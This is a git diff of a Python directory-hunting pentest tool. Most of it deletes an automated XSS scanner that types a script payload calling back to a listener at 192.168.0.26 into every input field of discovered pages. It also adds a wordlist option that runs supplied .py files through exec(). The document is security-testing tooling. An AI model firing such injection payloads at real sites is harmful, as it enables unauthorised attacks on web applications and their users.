@@ -235,100 +235,10 @@ def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_opt
 		return shared_data["found_list"]
 
 
-
-
-#XSS-SCAN
-def xss_scan(url_dict):
-	url_map = {i + 1: url for i, url in enumerate(url_dict)}
-
-	print(f"\n{BOLD}Starting XSS scan ({len(url_map)} URLs found){RESET}")
-	# Flask App
-	app = Flask(__name__)
-
-	cli = sys.modules.get('flask.cli')
-	if cli:
-		cli.show_server_banner = lambda *x: None  # Disable banner
-	log = logging.getLogger('werkzeug')
-	log.setLevel(logging.ERROR)
-
-
-	@app.route('/test', methods=['GET'])
-	def test_endpoint():
-		index = request.args.get('index', '')
-
-		if index and index.isdigit():
-			index = int(index)
-			url = url_map.get(index, "Unknown")
-			print(f"{GREEN}[GOT]{RESET} Received XSS payload from {url}")
-		return "Received"
-
-
-
-	def run_server():
-		app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
-
-	def load_urls(file_path):
-		with open(file_path, 'r') as f:
-			urls = [line.strip() for line in f if line.strip()]
-		return {i + 1: url for i, url in enumerate(urls)}
-
-	def is_url_reachable(url, timeout=3):
-		try:
-			response = requests.head(url, allow_redirects=True, timeout=timeout)
-			return True
-		except requests.RequestException:
-			return False
-
-	def scan_urls(url_dict):
-		geckodriver_path = "/usr/local/bin/geckodriver"
-		firefox_binary_path = "/usr/bin/firefox"
-
-		options = webdriver.FirefoxOptions()
-		options.headless = True
-		options.add_argument("--headless")
-		options.binary_location = firefox_binary_path
-
-
-		for index, url in url_dict.items():
-			time.sleep(3)
-			service = Service(geckodriver_path)
-			driver = webdriver.Firefox(service=service, options=options)
-			if is_url_reachable(url):
-				print(f"\n{PURPLE}[+]{RESET} Scanning {url}")
-
-				try:
-					driver.get(url)
-					xss_payload = f'''<script>fetch('https://192.168.0.26:8080/test?index={index}');</script>'''
-					inputs = driver.find_elements(By.TAG_NAME, "input")
-					print(f"[+] Found {len(inputs)} input(s)")
-					for input_element in inputs:
-						try:
-							input_type = input_element.get_attribute("type") or "text"
-							if input_type in ["text", "search", "email", "password", "url", "tel", "number"]:
-								driver.execute_script("arguments[0].scrollIntoView(true);", input_element)
-								input_element.clear()
-								input_element.send_keys(xss_payload)
-								input_element.send_keys(Keys.RETURN)
-								#print(f"[+] Injected into input")
-						except Exception as e:
-							print(f"{error} Error injecting into input")
-				except Exception as e:
-					print(f"{error} Error loading URL")
-				finally:
-					driver.quit()
-			else:
-				print(f"{error} {url} Is unreachable")
-
-	server_thread = threading.Thread(target=run_server)
-	server_thread.daemon = True
-	server_thread.start()
-	time.sleep(3)
-	scan_urls(url_map)
-
 #arguments
 parser = argparse.ArgumentParser(description="Directory hunting tool for discovering URLs.")
 parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g. https://example.com)")
-parser.add_argument("-w", "--wordlist", type=str, required=True, help="Path wordlist (e.g. common.txt)")
+parser.add_argument("-w", "--wordlist", type=str, required=True, help="Specifies the path to a custom wordlist file (e.g., common.txt). If not provided, a default wordlist located in lists/wordlists/ will be used. Alternatively, you may specify one of the three built-in wordlists by using small, medium, or large as the argument. If the provided file ends with .py, it will be treated as a Python script and executed to dynamically generate the wordlist.")
 parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout for requests in seconds")
 parser.add_argument("-o", "--output", type=str, help="File to save the output (e.g. results.txt)")
 parser.add_argument("-a", "--auth", type=str, help="Basic authentication in the format 'username:password'")
@@ -336,7 +246,6 @@ parser.add_argument("-p", "--proxy", nargs='?', const="built_in", help="Proxy to
 parser.add_argument("-m", "--method", type=str, default="GET", help="Method to use (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH)")
 parser.add_argument("-n", "--threads", type=int, default=10, help="Number of threads to use (default is 10)")
 parser.add_argument("-i", "--info", action="store_true", help="See more info about the requests")
-parser.add_argument("-x", "--xss", action="store_true", help="After path discovery, test for XSS vulnerabilities on the discovered paths. For standalone XSS scanning, visit: https://github.com/0c1av/XSScan")
 
 args = parser.parse_args()
 
@@ -356,18 +265,32 @@ error = f"{RED}[!]{RESET}"
 
 
 #basic variables
-pentest_list = []
 start_time = time.time()
 url = args.url
-path_file = args.wordlist
+
+def check_path_existance(path_file):
+        if not os.path.exists(path_file):
+                print(f"{RED}[ERROR]{RESET} The given wordlist path does not exist")
+                sys.exit()
+
+if args.wordlist is None:
+        print(f"{ORANGE}[WARNING]{RESET} Wordlist not specified, using default wordlist")
+        path_file = 'lists/wordlists/small_wordlist.txt'
+        check_path_existance(path_file)
+elif args.wordlist == "small":
+        path_file = '../lists/wordlists/small_wordlist.txt'
+        check_path_existance(path_file)
+elif args.wordlist == "medium":
+        path_file = '../lists/wordlists/medium_wordlist.txt'
+        check_path_existance(path_file)
+elif args.wordlist == "large":
+        path_file = '../lists/wordlists/large_wordlist.txt'
+        check_path_existance(path_file)
+else:
+    path_file = args.wordlist
+
 thread_amount = args.threads
 info_option = args.info
-xss_option = args.xss
-if xss_option:
-	pentest_list.append("XSS")
-if not os.path.exists(path_file):
-	print(f"{RED}[ERROR]{RESET}Wordlist not found")
-	sys.exit()
 timeout = args.timeout
 output_file = args.output
 if output_file == None:
@@ -404,8 +327,8 @@ change_protocol = False
 #authentication info
 auth = None
 if args.auth:
-        username, password = args.auth.split(":")
-        auth = HTTPBasicAuth(username, password)
+	username, password = args.auth.split(":")
+	auth = HTTPBasicAuth(username, password)
 
 if url.startswith("https://") or url.startswith("http://"):
 	pass
@@ -425,26 +348,41 @@ if args.proxy:
 			url = url.replace("https://", "http://")
 		proxy = get_proxy_with_api()
 if proxy_option:
-        if url.startswith("https://"):
-                proxies = {"https": f"https://{proxy}"}
-        else:
-                proxies = {"http": f"http://{proxy}"}
+	if url.startswith("https://"):
+		proxies = {"https": f"https://{proxy}"}
+	else:
+		proxies = {"http": f"http://{proxy}"}
 
 
 #list
 if output_file is not None:
-        with open(output_file, 'w') as file:
-                file.write("")
+	with open(output_file, 'w') as file:
+		file.write("")
 
 
-with open(path_file, 'r') as file:
-        paths_list = file.readlines()
-        shared_data["total_paths"] = len(paths_list)
-
+paths_list = []
+if path_file.endswith(".py"):
+	script_variables = {}
+	with open(path_file, 'r') as f:
+		user_code = f.read()
+		try:
+			exec(user_code, {}, script_variables)
+			if "paths_list" in script_variables and isinstance(script_variables["paths_list"], list):
+				paths_list = script_variables["paths_list"]
+			else:
+				print("[!] Script did not define a proper paths_list.")
+		except Exception as e:
+			print(f"[!] Error running user path script: {e}")
+else:
+	with open(path_file, 'r') as file:
+		paths_list = file.readlines()
+shared_data["total_paths"] = len(paths_list)
+#print(paths_list)
 
 # ping thread
 access_event = threading.Event()
 stop_event = threading.Event()
+
 
 def alert_worker():
 	while not stop_event.is_set():
@@ -500,7 +438,6 @@ print(f"Proxy:       {proxies}")
 print(f"Auth:        {auth}")
 print(f"Method:      {method.upper()}")
 print(f"Threads:     {thread_amount}")
-print(f"Pentesting:  {pentest_list}")
 print("========================================================")
 print(f"{current_time}: CyberScout launched by {user}")
 print("========================================================")
@@ -557,9 +494,6 @@ except KeyboardInterrupt:
 
 	prog_end()
 
-try:
-	if xss_option:
-		xss_scan(shared_data["found_list"])
 except KeyboardInterrupt:
 	print("Keyboard interrumpt\n")
 	prog_end()
